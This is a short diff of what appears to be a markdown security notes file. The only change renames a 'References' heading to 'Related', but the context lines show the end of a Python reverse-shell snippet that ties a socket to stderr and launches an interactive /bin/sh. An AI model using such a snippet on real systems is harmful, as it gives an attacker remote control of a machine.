@@ -8,7 +8,7 @@ os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
 ```
 
-# References
+# Related
 
 Tags:
     #assorted
